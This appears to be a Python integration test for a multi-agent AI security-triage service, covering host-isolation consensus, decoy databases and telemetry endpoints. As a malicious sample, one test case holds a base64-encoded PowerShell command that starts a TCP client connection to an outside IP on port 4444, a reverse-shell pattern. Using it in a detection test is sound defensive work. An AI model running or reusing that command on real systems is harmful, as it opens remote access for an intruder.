import urllib.request
import urllib.error
import urllib.parse
import json
import sys

if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

BASE_URL = "http://localhost:8000"

def make_req(endpoint, method="GET", body=None, params=None, token=None):
    url = f"{BASE_URL}{endpoint}"
    if params:
        url += "?" + urllib.parse.urlencode(params)
    data = json.dumps(body).encode("utf-8") if body else None
    headers = {"Content-Type": "application/json"} if body else {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req) as res:
            res_body = res.read().decode("utf-8")
            return res.status, json.loads(res_body) if res_body else {}
    except urllib.error.HTTPError as e:
        err_body = e.read().decode("utf-8")
        try:
            parsed = json.loads(err_body)
        except Exception:
            parsed = {"detail": err_body}
        return e.code, parsed

def run_test():
    print("--- [V13.0 Autonomous AI SOC Consensus & Cognitive Deception Verification Suite] ---")

    # 1. Authenticate Analyst Session
    print("\n1. Authenticating test analyst session...")
    test_email = "aisoc_analyst_v13@soc.corp.internal"
    test_password = "MasterPassword123!"

    reg_status, reg_data = make_req("/api/auth/register", method="POST", body={
        "org_name": "V13 Autonomous Cyber Defense Mesh",
        "email": test_email,
        "password": test_password
    })
    
    login_status, login_data = make_req("/api/auth/login", method="POST", body={
        "email": test_email,
        "password": test_password
    })
    if login_status != 200:
        print(f"[!] Authentication failed: {login_data}")
        sys.exit(1)
    
    token = login_data["access_token"]
    print(f"   [+] Authentication successful. Token obtained: {token[:18]}...")

    # 2. Multi-Agent AI SOC Consensus: Critical Threat Scenario
    print("\n2. Executing Multi-Agent AI Consensus on Critical Threat (Encoded PowerShell + Hostile IOC)...")
    crit_status, crit_res = make_req("/api/consensus/triage", method="POST", body={
        "hostname": "finance-workstation-01",
        "process_cmd": "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAiACwANAA0ADQANAApAA==",
        "src_ip": "185.220.101.5",
        "src_port": 49210,
        "severity": 4
    }, token=token)

    assert crit_status == 200, f"Consensus failed: {crit_res}"
    print(f"   [✓] Composite Risk Score: {(crit_res['composite_risk_score']*100):.1f}%")
    print(f"   [✓] Panel Confidence: {(crit_res['evaluation_confidence']*100):.1f}%")
    print(f"   [✓] Majority Verdict: {crit_res['majority_verdict']}")
    print(f"   [✓] Consensus Action: {crit_res['consensus_action']}")
    print(f"   [✓] Cryptographic Containment Signature: {crit_res['authorized_signature']}")
    assert crit_res["consensus_action"] == "ACTIVE_ISOLATE_HOST", "Expected active host isolation"
    assert crit_res["authorized_signature"] is not None, "Expected cryptographic action signature"

    # Agent breakdown assertions
    votes = crit_res["agent_votes"]
    print(f"       - Agent Alpha (Investigator): Risk={votes['investigator']['risk']} | Vote={votes['investigator']['vote_isolate']}")
    print(f"       - Agent Beta (Intel Aggregator): Risk={votes['intel_aggregator']['risk']} | Vote={votes['intel_aggregator']['vote_isolate']}")
    print(f"       - Agent Gamma (Containment): Risk={votes['containment_specialist']['risk']} | Vote={votes['containment_specialist']['vote_isolate']}")

    # 3. Multi-Agent AI SOC Consensus: Benign Normal Traffic Scenario
    print("\n3. Executing Multi-Agent AI Consensus on Benign Traffic (Scheduled Backup)...")
    benign_status, benign_res = make_req("/api/consensus/triage", method="POST", body={
        "hostname": "backup-node-04",
        "process_cmd": "/usr/bin/rsync -avz /var/log/ /mnt/backup/",
        "src_ip": "10.0.1.20",
        "src_port": 22,
        "severity": 1
    }, token=token)

    assert benign_status == 200, f"Benign consensus failed: {benign_res}"
    print(f"   [✓] Composite Risk Score: {(benign_res['composite_risk_score']*100):.1f}%")
    print(f"   [✓] Consensus Action: {benign_res['consensus_action']}")
    assert benign_res["consensus_action"] == "MONITOR_FLOW", "Expected passive monitoring for benign activity"
    assert benign_res["authorized_signature"] is None, "Should not sign containment for benign activity"

    # 4. Consensus History
    print("\n4. Querying Autonomous Consensus Triage History...")
    hist_status, hist_data = make_req("/api/consensus/history", token=token)
    assert hist_status == 200
    assert len(hist_data) >= 2
    print(f"   [✓] Retrieved {len(hist_data)} recorded triage evaluations.")

    # 5. Cognitive Deception: Dynamic Tech-Stack Decoy Cloning & eBPF Rerouting
    print("\n5. Triggering Self-Assembling Cognitive Decoy Honey-Infrastructure...")
    decoy_status, decoy_res = make_req("/api/consensus/orchestrate-decoy", method="POST", body={
        "attacker_ip": "198.51.100.44",
        "target_port": 5432,
        "target_stack": "PostgreSQL 16.1 (Production Cluster)"
    }, token=token)

    assert decoy_status == 200, f"Decoy assembly failed: {decoy_res}"
    print(f"   [✓] Decoy UID: {decoy_res['decoy_id']}")
    print(f"   [✓] Target Stack Cloned: {decoy_res['target_stack']}")
    print(f"   [✓] Dynamic Bootstrap Latency: {decoy_res['spawn_latency_ms']} ms")
    print(f"   [✓] eBPF XDP Action: {decoy_res['ebpf_redirection_rule']['xdp_action']}")
    print(f"   [✓] Canary Honeypot User: {decoy_res['canary_credentials']['database_user']}")
    print(f"   [✓] Seeded Synthetic Tables: {decoy_res['canary_credentials']['seeded_synthetic_tables']}")

    # Active Decoys List
    decoys_status, decoys_list = make_req("/api/consensus/active-decoys", token=token)
    assert decoys_status == 200
    assert len(decoys_list) >= 1
    print(f"   [✓] Active Decoys in Registry: {len(decoys_list)}")

    # 6. Hardware DPU SmartNIC Ingestion Telemetry
    print("\n6. Querying NVIDIA BlueField-3 SmartNIC DPU Telemetry...")
    dpu_status, dpu_data = make_req("/api/consensus/dpu-status", token=token)
    assert dpu_status == 200
    print(f"   [✓] DPU Model: {dpu_data['dpu_model']}")
    print(f"   [✓] Line-Rate Throughput: {dpu_data['current_eps']:,} EPS")
    print(f"   [✓] Hardware Zero-Copy DMA: {dpu_data['dma_kernel_bypass']}")
    print(f"   [✓] Hardware Latency: {dpu_data['avg_latency_microseconds']} µs")

    # 7. Cross-Tenant Differential Privacy GNN Mesh
    print("\n7. Querying Cross-Tenant Differential Privacy GNN Mesh...")
    gnn_status, gnn_data = make_req("/api/consensus/gnn-mesh", token=token)
    assert gnn_status == 200
    print(f"   [✓] Federated Topology: {gnn_data['mesh_topology']}")
    print(f"   [✓] Active Sovereign Tenants: {gnn_data['active_tenant_nodes']} Node Clusters")
    print(f"   [✓] Differential Privacy Guarantee: {gnn_data['privacy_mechanism']}")
    print(f"   [✓] SMPC Status: {gnn_data['smpc_aggregation_status']}")
    print(f"   [✓] Coordinated Threats Suppressed: {gnn_data['coordinated_campaigns_detected']}")

    print("\n>>> ALL V13.0 AUTONOMOUS AI SOC & COGNITIVE DECEPTION TESTS PASSED SUCCESSFULLY! <<<")

if __name__ == "__main__":
    run_test()
